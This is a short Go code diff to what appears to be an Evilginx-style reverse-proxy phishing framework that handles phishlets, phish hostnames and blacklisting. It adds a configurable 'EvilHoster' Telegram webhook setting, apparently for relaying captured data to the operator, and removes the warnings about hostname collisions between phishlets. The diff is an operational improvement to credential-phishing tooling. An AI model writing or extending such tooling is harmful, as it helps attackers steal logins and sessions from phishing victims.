@@ -73,6 +73,7 @@ type GeneralConfig struct {
 	UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
 	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
 	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
+	WebhookTelegram string `mapstructure:"webhook_telegram" json:"webhook_telegram" yaml:"webhook_telegram"`
 	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
 }
 
@@ -478,6 +479,18 @@ func (c *Config) SetBlacklistMode(mode string) {
 	log.Info("blacklist mode set to: %s", mode)
 }
 
+func (c *Config) SetWebhookTelegram(webhook string) {
+	c.general.WebhookTelegram = webhook
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("EvilHoster Telegram webhook set to: %s", webhook)
+	err := c.cfg.WriteConfig()
+	if err != nil {
+		log.Error("write config: %v", err)
+	}
+}
+
+
+
 func (c *Config) SetUnauthUrl(_url string) {
 	c.general.UnauthUrl = _url
 	c.cfg.Set(CFG_GENERAL, c.general)
@@ -637,11 +650,6 @@ func (c *Config) VerifyPhishlets() {
 		for _, ph := range pl.proxyHosts {
 			phish_host := combineHost(ph.phish_subdomain, ph.domain)
 			orig_host := combineHost(ph.orig_subdomain, ph.domain)
-			if c_site, ok := hosts[phish_host]; ok {
-				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", phish_host, site, c_site)
-			} else if c_site, ok := hosts[orig_host]; ok {
-				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", orig_host, site, c_site)
-			}
 			hosts[phish_host] = site
 			hosts[orig_host] = site
 		}
